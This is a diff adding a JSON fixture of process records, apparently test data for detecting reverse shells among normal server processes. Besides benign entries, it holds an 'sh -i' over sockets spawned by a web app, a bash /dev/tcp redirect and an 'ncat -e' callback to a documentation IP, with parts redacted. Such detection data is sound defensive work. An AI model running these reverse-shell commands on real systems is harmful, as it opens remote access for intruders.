@@ -1,0 +1,10 @@
+[
+  {"pid": 100, "ppid": 1, "host": "api-1", "exe": "python3 app.py", "cmdline": "python3 app.py --port 8080"},
+  {"pid": 200, "ppid": 1, "host": "api-1", "exe": "crond", "cmdline": "crond -f"},
+  {"pid": 201, "ppid": 200, "host": "api-1", "exe": "sh", "cmdline": "sh /etc/periodic/daily/logrotate", "stdin_type": "file", "stdout_type": "file"},
+  {"pid": 300, "ppid": 100, "host": "api-1", "exe": "sh", "cmdline": "sh -i", "stdin_type": "socket", "stdout_type": "socket"},
+  {"pid": 400, "ppid": 1, "host": "api-2", "exe": "java", "cmdline": "java -jar orders.jar"},
+  {"pid": 401, "ppid": 400, "host": "api-2", "exe": "bash", "cmdline": "bash -c [REDACTED: redirect to /dev/tcp/ endpoint]", "stdin_type": "pipe", "stdout_type": "pipe"},
+  {"pid": 500, "ppid": 1, "host": "worker-1", "exe": "ncat", "cmdline": "ncat -e [REDACTED] 198.51.100.23 [REDACTED]"},
+  {"pid": 600, "ppid": 100, "host": "api-1", "exe": "python3", "cmdline": "python3 /app/jobs/resize_image.py"}
+]
